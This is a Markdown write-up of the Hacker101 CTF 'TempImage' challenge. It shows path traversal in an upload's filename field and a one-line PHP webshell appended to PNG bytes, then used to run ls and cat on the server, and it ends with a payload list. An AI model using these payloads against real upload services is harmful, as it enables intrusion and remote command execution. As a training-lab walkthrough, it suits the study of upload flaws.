# 🖼️ TempImage

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `2/2` ✅

---

## ⛓️ Attack Chain

```
Path traversal on filename → escape /files directory → Flag 0
→ Inject PHP webshell into PNG payload → RCE → ls → cat index.php → Flag 1
```

---

## 🔍 Application Overview

A PNG-only image upload app. Files are uploaded to `/files/` with an MD5-prefixed filename. The `filename` field in the POST request is passed directly to `move_uploaded_file()` with no path sanitization — enabling both path traversal and code injection.

> 💡 The random prefix before the filename is just the **MD5 hash of the filename itself**.

---

## 🚩 Flag 0 — Path Traversal on Upload

Intercept the `/doUpload.php` POST request in Burp. Modify the `filename` field with a path traversal sequence:

**Step 1 — Test single traversal (causes crash, reveals stack trace):**
```
filename: ../test.png
```

Stack trace leaks the full server path — useful for understanding the structure.

**Step 2 — Correct payload with leading slash:**
```
filename: /../test.png
```

**Step 3 — Escape /files with double traversal + change extension:**
```
filename: /../../test.php
```

The server uploads the file outside `/files/` and Flag 0 appears in the response.

---

## 🚩 Flag 1 — PHP Webshell Injection + RCE

The server only validates the file extension and PNG magic bytes — it does **not** inspect the full file content.

**Step 1 — Inject PHP webshell after the PNG bytes in Burp:**

```
[PNG file content]<?php system($_GET['command']); ?>
```

Upload with double path traversal:
```
filename: /../../shell.php
```

**Step 2 — Execute commands via the uploaded shell:**

```
/shell.php?command=ls
```

Found `index.php` in the output.

**Step 3 — Read index.php:**

```
/shell.php?command=cat index.php
```

Flag 1 was inside `index.php` as a PHP comment — invisible in the browser source, only readable via RCE.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| Path Traversal | `filename` passed directly to `move_uploaded_file()` with no sanitization |
| Webshell Execution | Server validates extension and magic bytes but ignores rest of file content |
| RCE | Uploaded `.php` file executed by the server, giving full command access |

---

## 📋 Payloads

```
# Flag 0 — Path traversal to escape /files
filename: /../../test.php

# Flag 1 — Webshell injected into PNG content in Burp
[PNG bytes]<?php system($_GET['command']); ?>
filename: /../../shell.php

# List files
/shell.php?command=ls

# Read index.php for Flag 1
/shell.php?command=cat index.php
```
